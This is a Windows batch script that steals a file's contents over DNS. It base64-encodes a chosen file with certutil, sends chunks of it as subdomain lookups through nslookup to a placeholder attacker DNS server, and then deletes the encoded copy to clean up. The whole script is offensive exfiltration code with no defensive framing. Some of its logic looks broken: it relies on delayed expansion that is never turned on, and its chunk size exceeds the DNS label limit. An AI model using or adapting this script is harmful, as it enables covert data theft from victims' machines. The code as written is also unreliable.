@echo off
set "data_to_exfil=C:\path\to\sensitive\data.txt"
set "dns_server=attacker_dns_server.com"
set "exfil_domain=exfil.attacker_dns_server.com"

:: Convert data to base64
certutil -encode %data_to_exfil% %data_to_exfil%.b64

:: Split base64 data into chunks (max 255 chars each)
set /a chunk_size=255
set "chunk_num=0"
set "b64_data="
for /f "tokens=*" %%f in (%data_to_exfil%.b64) do (
    set "b64_data=%%f"
    set /a chunk_num+=1
    set "chunk=!b64_data:~0,%chunk_size%!"
    nslookup %chunk%.%exfil_domain% %dns_server%
    set "b64_data=!b64_data:~%chunk_size%!"
)

:: Clean up
del %data_to_exfil%.b64